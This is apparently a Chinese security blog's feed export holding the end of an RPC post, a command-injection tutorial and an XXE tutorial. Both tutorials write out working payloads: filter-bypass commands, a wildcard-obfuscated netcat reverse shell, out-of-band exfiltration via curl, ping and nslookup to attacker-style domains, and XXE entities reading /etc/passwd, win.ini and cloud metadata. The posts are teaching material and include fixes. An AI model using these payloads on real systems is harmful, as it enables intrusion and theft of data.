产生原因"></a>0x03 产生原因</h4><p><strong>RPC</strong>主要解决俩个问题</p><blockquote><ol><li><strong>解决分布式系统中，服务之间的调用问题。</strong></li><li><strong>远程调用时，要能够像本地调用一样方便，让调用者感知不到远程调用的逻辑。</strong></li></ol></blockquote><h4 id="0x04-过程实现"><a href="#0x04-过程实现" class="headerlink" title="0x04 过程实现"></a>0x04 过程实现</h4><ul><li><p>传递值参数</p><p>使用RPC进行远程计算，其中，远程过程add(i,j)有俩个参数i和j，其结果是返回i和j的算数和。<img src="/image/RPC/5.png" alt="5"></p><p>通过 <strong>RPC</strong> 进行远程计算步骤：</p><ol><li>将参数放入消息中，并在消息中添加要调用的过程的名称或者编码。</li><li>消息到达服务器后，服务器存根堆该消息进行分析，以判明需要调用哪个过程，随后执行相应的调用。</li><li>服务器运行完毕后，服务器存根将服务器得到的结果打包成消息送回客户存根，客户存根将结果从消息中提取出来，把结果值返回给客户端。</li></ol></li></ul><ul><li><p>传递引用参数</p><p>传递引用参数相对来说比较困难。单纯传递参数的引用（也包含指针）是完全没有意义的，因为引用地址传递给远程计算机,其指向的内存位置可能跟远程系统上完全不同。如果想支持传递引用参数,必须发送参数的副本,将它们放置在远程系统内存中，向他们传递一个指向服务器函数的指针，然后将对象发送回客户端，复制它的引用。如果远程过程调用必须支持引用复杂的结构，比如树和链表，他们需要将结构复制到一个无指针的表示里面（比如，一个扁平的树)，并传输到在远程端来重建数据结构。</p></li></ul><h4 id="0x05-RPC漏洞"><a href="#0x05-RPC漏洞" class="headerlink" title="0x05 RPC漏洞"></a>0x05 RPC漏洞</h4><p>微软的一些<strong>RPC</strong>漏洞，通过畸形的<strong>RPC</strong>请求，触发<strong>C/C++<strong>的字符串拷贝连接之类的问题，造成内存覆盖，引发安全漏洞。如</strong>MS08067</strong>。</p><p>区块链中也存在<strong>RPC</strong>相关的漏洞，如<strong>RPC</strong>设计引发的逻辑类盗币漏洞</p><ul><li><p>以太坊对于账户的<strong>RPC</strong>调用支持<strong>unlockaccount api</strong></p><p>在调用<strong>unlockaccount api</strong>时，需要提供地址，密码和解锁时间。一旦解锁时间，该钱包若还暴露在公网上，在<strong>duration</strong>期间的钱包，任何人在<strong>duration</strong>这段期间都有权限将钱包中的eth转走。</p><p>整个攻击流程如下：攻击者预先扫描 <strong>8545</strong> 端口（<strong>HTTP JSON RPC API）</strong>、<strong>8546</strong> 端口（<strong>WebSocket JSON RPC API）</strong>等开放的以太坊节点，遍历区块高度、钱包地址及余额，一旦有余额的地址处于<strong>unlock duration</strong>，重复调用 <strong>eth_sendTransaction</strong> 将余额转空。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-概念介绍&quot;&gt;&lt;a href=&quot;#0x01-概念介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 概念介绍&quot;&gt;&lt;/a&gt;0x01 概念介绍&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;RPC&lt;/strong&gt;即远程过程调用&lt;strong&gt;（Remote</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="RPC" scheme="https://banana69.site/tags/RPC/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://banana69.site/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-09-19T05:04:31.000Z</published>
    <updated>2021-10-17T12:18:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-命令执行漏洞介绍"><a href="#0x01-命令执行漏洞介绍" class="headerlink" title="0x01 命令执行漏洞介绍"></a>0x01 命令执行漏洞介绍</h4><p><img src="/image/os-injection/1.png" alt="1"></p><p>命令注入指应用程序的某些功能调用了可以执行系统命令的函数，攻击者控制函数或者函数的参数就可能通过命令连接符将恶意命令拼接到正常的函数中，从而随意执行系统命令。</p><ul><li><p><strong>system函数</strong></p><p><strong>system</strong>函数用于执行外部程序，并且显示输出，用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> system(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_va</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>exec函数</strong></p><p><strong>exec</strong>函数用于执行一个外部程序，用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> exec(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">array</span> &amp;<span class="variable">$output</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span> <span class="comment">//该代码需要使用echo函数才能输出结果</span></span><br></pre></td></tr></table></figure></li><li><p><strong>shell_exec函数</strong></p><p><strong>shell_exec</strong>函数通过<strong>shell</strong>环境执行命令，并且将完整的输出以字符串的方式返回，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> shell_exec(<span class="keyword">string</span> <span class="variable">$cmd</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span> <span class="comment">//该代码需要使用echo函数才能输出结果</span></span><br></pre></td></tr></table></figure></li><li><p><strong>passthru函数</strong></p><p><strong>passthru</strong>函数用于执行外部程序并且显示原始输出，其用法如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> passthru(<span class="keyword">string</span> <span class="variable">$command</span>[, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> passthru(<span class="string">&#x27;whoami&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>popen函数</strong></p><p><strong>popen</strong>函数用于打开进程文件指针，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">resource popen(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> popen(<span class="string">&quot;touch 1.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="meta">?&gt;</span> <span class="comment">//执行后会在当前文件夹创建1.txt</span></span><br></pre></td></tr></table></figure></li><li><p><strong>proc_open函数</strong></p><p><strong>proc_open</strong>函数用于执行一个命令，并且打开用来输入输出的文件指针，其用法如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$proc</span> = proc_open(<span class="string">&quot;whoami&quot;</span>,</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;W&quot;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipr&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">),</span><br><span class="line"><span class="variable">$pipes</span>);</span><br><span class="line"><span class="keyword">print</span> steam_get_contents(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>反单引号</strong></p><p><strong>`<strong>是</strong>PHP</strong>执行运算符，<strong>PHP</strong>尝试将反单引号中的内容作为<strong>shell</strong>命令来执行，并将其输入信息返回。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h4><table><thead><tr><th align="center">Purpose of command</th><th align="center">Linux</th><th align="center">Windows</th></tr></thead><tbody><tr><td align="center">当前用户</td><td align="center"><code>whoami</code></td><td align="center"><code>whoami</code></td></tr><tr><td align="center">操作系统</td><td align="center"><code>uname -a</code></td><td align="center"><code>ver</code></td></tr><tr><td align="center">网络配置</td><td align="center"><code>ifconfig</code></td><td align="center"><code>ipconfig /all</code></td></tr><tr><td align="center">网络连接</td><td align="center"><code>netstat -an</code></td><td align="center"><code>netstat -an</code></td></tr><tr><td align="center">运行进程</td><td align="center"><code>ps -ef</code></td><td align="center"><code>tasklist</code></td></tr></tbody></table><h5 id="通过时间延迟检测盲操作系统命令注入"><a href="#通过时间延迟检测盲操作系统命令注入" class="headerlink" title="通过时间延迟检测盲操作系统命令注入"></a>通过时间延迟检测盲操作系统命令注入</h5><p>使用触发时间延迟的诸如命令，根据程序向响应包时间来确认命令已经执行，例如使用<strong>ping</strong>命令,<code>ping -c 10 127.0.0.1 &amp;</code>。</p><h5 id="通过输出重定向利用命令注入"><a href="#通过输出重定向利用命令注入" class="headerlink" title="通过输出重定向利用命令注入"></a>通过输出重定向利用命令注入</h5><p>将注入命令的输出重定向到 <strong>Web</strong> 根目录中的文件中，然后使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源<code>/var/www/static</code>，那么提交以下输入：<code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;</code>。</p><h5 id="通过OAST技术利用命令注入"><a href="#通过OAST技术利用命令注入" class="headerlink" title="通过OAST技术利用命令注入"></a>通过OAST技术利用命令注入</h5><p>通过使用 OAST 技术触发系统与外部网络发生交互。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</span><br></pre></td></tr></table></figure><p><code>nslookup</code>命令对指定域进行 DNS 查找。攻击者可以监视指定的查找发生，从而检测到命令已成功注入。</p><p><strong>OAST参考：</strong><a href="https://portswigger.net/burp/application-security-testing/oast">https://portswigger.net/burp/application-security-testing/oast</a></p><h4 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03 绕过"></a>0x03 绕过</h4><h5 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h5><ul><li><p>${IFS}绕过</p><p>**${IFS}**是 <strong>shell</strong> 的特殊环境变量，是 <strong>Linux</strong> 下的内部域分隔符。${IFS} 中存储的值可以是空格、制表符、换行符或者其它自定符号，可以使用 ${IFS} 来绕过空格。</p><p><code>exec.php?ip=127.0.0.1;cat$&#123;IFS&#125;exec.php</code></p></li><li><p>$IFS$9绕过</p><p><code>exec.php?ip=127.0.0.1;cat$IFS$9exec.php</code></p></li><li><p><strong>制表符绕过</strong></p><p><strong>%09</strong>是制表符的URL编码，可以通过 %09 来代替空格绕过空格过滤。</p><p><code>exec.php?ip=127.0.0.1;cat%09exec.php</code></p></li><li><p>{}绕过</p><p><code>exec.php?ip=127.0.0.1;&#123;cat,exec.php&#125;</code></p></li><li><p><strong>&lt;绕过</strong></p><p><code>cat&lt;exec.php</code></p></li></ul><h5 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h5><ul><li><p>变量拼接绕过</p><p>Linux支持变量赋值，可以通过变量拼接来绕过过滤规则。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a=c;b=cat;$a$b exec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;IP&#x27;</span>]</span><br><span class="line">system(<span class="string">&quot;ping -c 3 &quot;</span>.<span class="variable">$IP</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>空变量绕过</p><p><code>ca$&#123;x&#125;t exec.php</code></p></li><li><p>系统变量绕过</p><p>${SHELLOPTS} 是系统变量，可以利用系统变量的字符拼接绕过过滤。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@virtual-machine:/# $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;SHELLOPTS:2:3&#125;at exec.php=cat exec.php</span></span><br></pre></td></tr></table></figure></li><li><p>\ 绕过</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c\a\t exec.php</span><br></pre></td></tr></table></figure></li><li><p>通配符绕过</p><p><strong>Linux</strong>支持利用通配符进行字符匹配，通配符的作用是在模糊查询时表示文件名中某些不确定的字符。</p><p>通配符规则如下：</p><ul><li>*代表0到多个任意字符；</li><li>？代表任意一个字符；</li><li>[]内为字符范围，代表该字符范围中的任意一个字符。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//对于/etc/passwd文件过滤，可以利用通配符绕过</span><br><span class="line">  cat /???/???sw?</span><br></pre></td></tr></table></figure></li><li><p><strong>shell</strong>反弹绕过</p><p>在反弹shell时如果存在过滤，可以通过通配符来绕过过滤，执行系统命令。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//例如要执行该命令 /bin/nc 192.168.1.1 8888 -e /bin/bash</span><br><span class="line">首先将IP地址转换为十进制 3232235777 (也可转换为16进制)</span><br><span class="line">然后使用通配符替换关键字 /b??/?c 3232235777 8888 -e /???/b??h</span><br></pre></td></tr></table></figure></li><li><p><strong>Base64</strong>编码绕过</p><p>利用系统函数<strong>Base64</strong>对命令进行编码以绕过过滤。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id的base64编码为aWQ=</span><br><span class="line">执行 &#x27;echo &quot;aWQ=&quot; | base64 -d&#x27; 即可执行id命令</span><br></pre></td></tr></table></figure></li><li><p><strong>expr</strong>和<strong>awk</strong>绕过</p><p>通过<strong>expr</strong>和<strong>awk</strong>命令从其他文件中获取字符并进行命令伪造。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//test.txt文件中的内容为字符串 www.test.com,可以通过以下命令来获取字符串并进行命令构造。</span><br><span class="line">expr substr $(awk NR=1 test.txt) 1 1 </span><br><span class="line">//获得字符w</span><br></pre></td></tr></table></figure></li></ul><h5 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h5><p>若存在无回显的命令执行漏洞，可以通过<strong>shell</strong>反弹的方式将<strong>shell</strong>反弹到<strong>vps</strong>，然后通过<strong>vps</strong>执行命令。当无法反弹<strong>shell</strong>时也可以通过<strong>DNS</strong>管道解析的方式获取命令的执行结果。</p><p><strong>Linux</strong>中获取用户名</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl www.test.com/`whoami`</span><br><span class="line">ping -c 1 `whoami`.www.test.com</span><br></pre></td></tr></table></figure><p><strong>Windows</strong>中获取计算机名：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F %x in (&#x27;whoami&#x27;) do start http://www.test.com/%x</span><br></pre></td></tr></table></figure><p><strong>Windows</strong>中获取用户名：</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F &quot;delims=\ token=2&quot; %i in (&#x27;whoami&#x27;) do ping -n 1 %i.www.test.com</span><br></pre></td></tr></table></figure><p><img src="/image/os-injection/2.png" alt="2"></p><p>  开源<strong>DNSLog</strong>：</p><ul><li><a href="http://ceye.io/">http://ceye.io</a></li><li><a href="https://github.io.com/BugScanTeam/DNSLog">https://github.io.com/BugScanTeam/DNSLog</a></li></ul><h4 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h4><h5 id="服务器配置修复"><a href="#服务器配置修复" class="headerlink" title="服务器配置修复"></a>服务器配置修复</h5><p>通过<strong>PHP</strong>配置文件中的disable_functions禁用敏感函数来修复漏洞。</p><h5 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h5><ul><li><p><strong>escapeshellarg</strong>函数</p><p>该函数把字符串转码为可以在<strong>shell</strong>命令里使用的参数，以过滤命令中的参数。该函数可以给字符串增加一个单引号，并且能引用或者转义任何已经存在的单引号，这样就可以直接讲一个字符串传入<strong>shell</strong>函数，并且可以确保它是安全的。</p></li><li><p><strong>escapeshellcmd</strong>函数</p><p>该函数可以对<strong>shell</strong>元字符进行转义，过滤命令，可以对字符串中可能会欺骗<strong>shell</strong>执行恶意命令的字符进行转义。此函数保证用户输入的数据在传送到<strong>system</strong>函数或者执行操作符之前被转义。</p><p><strong>escapeshellcmd</strong>函数会在以下字符之前插入反斜杠<code>\</code>：<code>&amp;、#、;、|、*、？、~、&lt;、&gt;、^、（、）、[、]、&#123;、&#125;、$、\、\x0A和\xFF</code>。在<strong>Windows</strong>平台中上面所有的字符以及**%<strong>和</strong>！**都会被空格和代替。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-命令执行漏洞介绍&quot;&gt;&lt;a href=&quot;#0x01-命令执行漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令执行漏洞介绍&quot;&gt;&lt;/a&gt;0x01 命令执行漏洞介绍&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/image/os-inject</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="命令注入" scheme="https://banana69.site/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XXE注入方法</title>
    <link href="https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/"/>
    <id>https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/</id>
    <published>2019-09-24T07:21:46.000Z</published>
    <updated>2021-10-17T12:36:10.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-XML-攻击原理"><a href="#0x01-XML-攻击原理" class="headerlink" title="0x01 XML 攻击原理"></a>0x01 XML 攻击原理</h4><h6 id="①-XML介绍："><a href="#①-XML介绍：" class="headerlink" title="① XML介绍："></a>① XML介绍：</h6><ul><li><p><strong>XML</strong>实体：</p><p><strong>XML</strong>是一种被设计用于存储和传输数据的”可扩展标记语言”，且XML使用标签和数据的树状结构，XML不需要使用预定义标签。</p><p><strong>XML</strong>实体是在<strong>XML</strong>文档中表示数据项的一种方式，<strong>XML</strong>在语言规范中内置了很多实体。例如**&amp;lt<strong>表示</strong>&lt;**,**&amp;gt**表示**&gt;**。所以当这些字符出现在数据中时一般需要使用它们的实体来表示。</p><p><img src="/image/XXE/2.png" alt="2"></p></li><li><p>文档类型定义：</p><p><strong>XML</strong>文档类型定义**(document type definition ，DTD)<strong>包含的声明可以定义</strong>XML<strong>文档的结构。</strong>DTD<strong>可以独立于文档本身（内部</strong>DTD**），也可以从外部加载（外部DTD）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>自定义实体与外部实体：</p><p><strong>XML</strong>允许在<strong>DTD</strong>中自定义实体，如<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code>，意味着XML文档中任何引用&amp;myextity实体的值都会被替换为”my entity value”。</p><p><strong>XML</strong>外部实体也是一种自定义实体，但是其定义必须位于声明他们的<strong>DTD</strong>之外。外部实体使用<strong>SYSTEM</strong>关键字时，必须指定加载实体值的<strong>URL</strong>。例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code>，又因为URL可以使用file://协议，因此可以从文件中加载外部实体，例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code>，所以XML外部实体提供了XML外部实体攻击的主要方法。</p><blockquote><p><em>内部实体声明语法</em><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p><p><em>外部实体声明语法</em><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p></blockquote><h6 id="②-XML外部实体注入："><a href="#②-XML外部实体注入：" class="headerlink" title="② XML外部实体注入："></a>② XML外部实体注入：</h6></li></ul><p>​    <strong>XML</strong> 外部实体注入（也称为 <strong>XXE</strong>）是一种 <strong>Web</strong> 安全漏洞，允许攻击者干扰应用程序对 <strong>XML</strong> 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p><p><img src="/image/XXE/1.png" alt="1"></p><p>一些应用程序使用 <strong>XML</strong> 格式在浏览器和服务器之间传输数据。执行此操作的应用程序实际上总是使用标准库或平台 <strong>API</strong> 来处理服务器上的 <strong>XML</strong> 数据。<strong>XXE</strong> 漏洞的出现是因为 <strong>XML</strong> 规范包含各种潜在的危险特性，标准解析器支持这些特性，即使它们通常不被应用程序使用。</p><h4 id="0x02-XXE-攻击类型"><a href="#0x02-XXE-攻击类型" class="headerlink" title="0x02 XXE 攻击类型"></a>0x02 XXE 攻击类型</h4><ul><li><p>利用<strong>XXE</strong>读取（检索）<strong>files</strong>：</p><p>定义一个包含文件内容的外部实体，并在应用程序的响应中返回，如上图所示。</p></li><li><p>利用<strong>XXE</strong>执行<strong>SSRF</strong>攻击：</p><p>根据后端系统的 URL 定义外部实体。</p></li><li><p>利用盲<strong>XXE</strong>（无回显）造成数据泄露：</p><p>敏感数据从应用服务器传输到攻击者控制的系统。</p></li><li><p>利用盲<strong>XXE</strong>通过错误消息检索数据：</p><p>攻击者可以在其中触发包含敏感数据的解析错误消息。</p></li></ul><h4 id="0x03-XXE-攻击实验"><a href="#0x03-XXE-攻击实验" class="headerlink" title="0x03 XXE 攻击实验"></a>0x03 XXE 攻击实验</h4><h6 id="①-利用XXE检索文件"><a href="#①-利用XXE检索文件" class="headerlink" title="① 利用XXE检索文件"></a>① 利用XXE检索文件</h6><p><strong>XXE-Labs</strong>的环境比较简单，下边是源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//这里面因为没有xml文档所以用的是php的伪协议来获取我们发送的xml文档</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建XML的对象</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//将我们发送的字符串生成xml文档。</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//这一步感觉相当于实例化xml文档</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;<span class="comment">//获取username标签的值</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;<span class="comment">//获取password标签的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;<span class="comment">//将获取的值与前面的进行比较。...</span></span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);<span class="comment">//注意必须要有username这个标签，不然的话找不到username,就没有了输出了，我们也不能通过回显来获取信息了</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);<span class="comment">//与上方相同，都会输出username的值，都可以达到我们的目的</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该环境只需要使用<strong>Burp</strong>抓包后在发送数据时构造外部实体定义即可完成，在执行<strong>XXE</strong>攻击时需要在将<strong>username</strong>替换为对外部实体的引用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/XXE/3.png" alt="3"></p><h6 id="②-利用XXE进行SSRF攻击"><a href="#②-利用XXE进行SSRF攻击" class="headerlink" title="② 利用XXE进行SSRF攻击"></a>② 利用XXE进行SSRF攻击</h6><p>实验环境：<a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p><p>构造外部实体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;http://169.254.169.254/&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>将<code>productId</code>数字替换为对外部实体的引用：<code>&amp;ent</code>即可利用XXE漏洞来执行SSRF攻击。</p><p>  <img src="/image/XXE/4.png" alt="4"></p><p>在<strong>Response</strong>中可以看到返回值为<code>Invalid product ID latest</code>，继续尝试访问<code>latest</code>目录，查看相应的返回值最后完成该实验，实现了利用<strong>XXE</strong>进行<strong>SSRF</strong>攻击。</p><p><img src="/image/XXE/5.png" alt="5"></p><h6 id="③-通过XInclude-进行XXE攻击"><a href="#③-通过XInclude-进行XXE攻击" class="headerlink" title="③ 通过XInclude 进行XXE攻击"></a>③ 通过XInclude 进行XXE攻击</h6><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 <strong>XML</strong> 文档中，然后解析该文档。当客户端提交的数据被放入后端 <strong>SOAP</strong> 请求，然后由后端 <strong>SOAP</strong> 服务处理时，就会发生这种情况。</p><p>在这种情况下由于无法控制整个 <strong>XML</strong> 文档，所以法执行经典的 <strong>XXE</strong> 攻击，因此无法定义或修改<code>DOCTYPE</code>元素。但是可以利用<strong>XInclude</strong>。</p><p><strong>XInclude</strong>是 <strong>XML</strong> 规范的一部分，它允许从子文档构建 <strong>XML</strong> 文档。因此<strong>XInclude</strong>可以在 <strong>XML</strong> 文档中的任何数据值中部署<strong>XInclude</strong>攻击，因此，攻击可以在仅控制放在服务器端XML文档中的单个数据项的情况下执行。要执行<strong>XInclude</strong>攻击，需要引用<strong>XInclude</strong>名称空间并提供希望包含的文件的路径。例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>在该实验中，将<strong>productId</strong>的值改为构造的<strong>XInclude</strong>指令即可。</p><p><img src="/image/XXE/6.png" alt="6"></p><h6 id="④-通过文件上传的-XXE-攻击"><a href="#④-通过文件上传的-XXE-攻击" class="headerlink" title="④ 